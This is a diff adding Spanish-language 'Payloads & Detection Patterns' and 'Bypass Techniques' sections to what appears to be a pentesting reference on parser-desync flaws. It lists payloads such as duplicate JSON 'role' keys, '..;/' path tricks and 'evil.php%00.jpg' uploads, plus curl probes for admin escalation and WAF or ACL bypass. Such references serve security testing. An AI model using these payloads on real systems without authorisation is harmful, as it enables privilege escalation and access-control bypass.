@@ -93,6 +93,55 @@ chains_with: [http-smuggling, parameter-pollution, auth-bypass, broken-access-co
 - A small python harness emitting malformed JSON/multipart (raw bytes, not a library that
   "helpfully" normalizes) so you control exactly what each layer receives.
 
+## Payloads & Detection Patterns
+
+Guía de caza para el desync de *parsers* (no de framing: CL.TE/TE.CL/H2 framing va a
+`http-smuggling`). Una familia por discrepancia de contenido/ruta; la prueba es siempre que las
+*dos* capas leyeron los mismos bytes distinto y eso cambió una decisión.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Duplicate JSON keys | `{"role":"user","role":"admin"}`, type confusion `{"role":"user","role":["admin"]}` | Front honra una ocurrencia, backend otra (precedencia divergente) |
+| HTTP/2 downgrade | Request H2 reescrita a H1 en el edge con header/pseudo-header que cambia normalización | Edge normaliza distinto que el origin al bajar de versión |
+| Header normalization | Header duplicado, obs-fold (continuación con espacio), underscore↔dash (`X_Forwarded_For` vs `X-Forwarded-Host`), case | Una capa fusiona/descarta, la otra lee la variante contraria |
+| Chunk parsing divergente | `chunk-size` con espacios/comentario, trailers, `0\r\n` adelantado | Parser lenient vs strict (framing crudo → remite a `http-smuggling`) |
+| Content-Type/charset confusion | `application/json; charset=utf-7`, dual `Content-Type`, type inesperado | Body salta la capa que solo inspecciona `application/json` |
+| Multipart boundary/part | Boundary duplicado/whitespace/sin comillas, part names repetidos, doble `filename` | Split de partes distinto → cuela segundo campo/archivo |
+| Encoding normalization | `%00` truncation, overlong/invalid UTF-8, double/mixed URL-encode `%252e` | Filtro de extensión/rol evadido por normalización asimétrica |
+| Path normalization | `..;/`, `//`, `/./`, `%2e%2e%2f`, trailing-dot/case | Proxy autoriza una forma, origin resuelve otra (recurso protegido) |
+
+Surface signals que delatan la clase antes de probar:
+- Dos parsers conocidos distintos en el path (nginx/Go edge + Node/Express o Java/Spring origin).
+- Una decisión de seguridad (auth/route/WAF/filtro) tomada en la capa frontal y re-parseada por el backend.
+- Headers con underscore aceptados, `Content-Type` flexible, o `200` ante JSON/multipart malformado.
+
+```bash
+# Duplicate-key precedence: observar qué valor actúa (front vs backend)
+curl -s https://target/api/action -H 'Content-Type: application/json' \
+  --data '{"role":"user","role":"admin"}'                 # ¿la app actúa como admin?
+
+# Content-Type flip: mismo body, tipo declarado distinto
+curl -s https://target/api/action -H 'Content-Type: application/json; charset=utf-7' \
+  --data '{"role":"admin"}'                                # ¿el WAF deja de inspeccionar?
+
+# Path normalization contra ruta con control de acceso
+curl -s -o /dev/null -w '%{http_code}\n' https://target/admin/users          # control (bloqueado)
+curl -s -o /dev/null -w '%{http_code}\n' "https://target/admin/..;/admin/users"  # ¿origin resuelve?
+```
+
+## Bypass Techniques
+
+Agrupadas por la defensa de la capa frontal que evaden; la nota es la condición que delata cada una.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Regla WAF sobre JSON body | Flip de `Content-Type` a form/charset raro, dual CT | El edge solo aplica reglas JSON a `application/json` |
+| Filtro de extensión en upload | `evil.php%00.jpg`, doble `filename` en multipart, overlong UTF-8 | Backend trunca o elige una parte distinta a la que vio el edge |
+| ACL de path en proxy | `..;/`, `%2e%2e%2f`, `//`, `/./`, trailing-dot | Origin normaliza a un recurso protegido que el proxy no autorizó |
+| Auth por header en el edge | Underscore/case/obs-fold del header de identidad | Backend lee la variante que el edge no normalizó |
+| Dedup de clave por el WAF | Duplicate key con precedencia opuesta a la del backend | WAF lee la primera, la app la última (o viceversa) |
+| H2-only WAF rule | Enviar H2 que al downgrade a H1 cambia el framing/normalización | La regla inspecciona H2, el origin ve la forma H1 reescrita |
+
 ## Root Causes
 
 - Two parsers in the path implement the same spec differently (duplicate-key policy, multipart
